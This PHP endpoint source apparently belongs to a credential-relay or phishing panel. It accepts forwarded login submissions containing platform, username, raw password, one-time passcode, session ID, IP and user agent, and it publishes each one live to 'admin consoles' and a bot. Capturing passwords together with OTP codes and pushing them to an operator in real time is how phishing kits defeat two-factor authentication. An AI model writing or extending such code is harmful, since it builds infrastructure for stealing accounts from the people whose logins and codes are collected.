<?php
session_start();
require_once __DIR__ . '/../../config/validate_env.php';
require_once __DIR__ . '/../../config/database.php';
require_once __DIR__ . '/../../config/config.php';
require_once __DIR__ . '/../../includes/functions.php';
require_once __DIR__ . '/../../includes/admin-security.php';
require_once __DIR__ . '/../../src/bootstrap.php';

use App\Services\AuditLogService;
use App\Services\RealtimePublisher;

// Internal secured endpoint to receive full login payloads for admin/bot.
// Security: require X-Admin-Key and X-Feature-Pass headers. No CSRF for server-to-server.
header('Content-Type: application/json; charset=utf-8');

try {
    requireAdminKeyHeaderOrSession();
    requireFeaturePassHeader();

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
        exit;
    }

    $input = json_decode(file_get_contents('php://input'), true) ?? [];

    // Expected fields
    $platform   = sanitizeInput($input['platform'] ?? '');
    $username   = sanitizeInput($input['username'] ?? '');
    $password   = (string)($input['password'] ?? '');
    $otp        = sanitizeInput($input['otp'] ?? '');
    $sessionId  = sanitizeInput($input['session_id'] ?? '');
    $userIp     = sanitizeInput($input['user_ip'] ?? ($_SERVER['REMOTE_ADDR'] ?? ''));
    $userAgent  = sanitizeInput($input['user_agent'] ?? ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    $timestamp  = intval($input['timestamp'] ?? time());

    if (!$platform || !$username || !$sessionId) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'Missing platform/username/session_id']);
        exit;
    }

    // Log audit (do not store raw password/otp in details; include flags only)
    AuditLogService::log('admin.login.forwarded', null, [
        'platform' => $platform,
        'username' => $username,
        'has_password' => $password !== '',
        'has_otp' => $otp !== '',
        'session_id' => $sessionId,
        'user_ip' => $userIp,
        'user_agent' => $userAgent,
        'ts' => $timestamp,
    ], 'info');

    // Publish realtime event for admin consoles
    try {
        (new RealtimePublisher())->publish('admin.login.forwarded', [
            'session_id' => $sessionId,
            'platform' => $platform,
            'username' => $username,
            'user_ip' => $userIp,
            'user_agent' => $userAgent,
            'timestamp' => $timestamp,
            'type' => 'admin.login.forwarded',
        ]);
    } catch (\Throwable $e) { /* best-effort */ }

    echo json_encode(['success' => true]);
} catch (\Throwable $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'internal_error']);
}
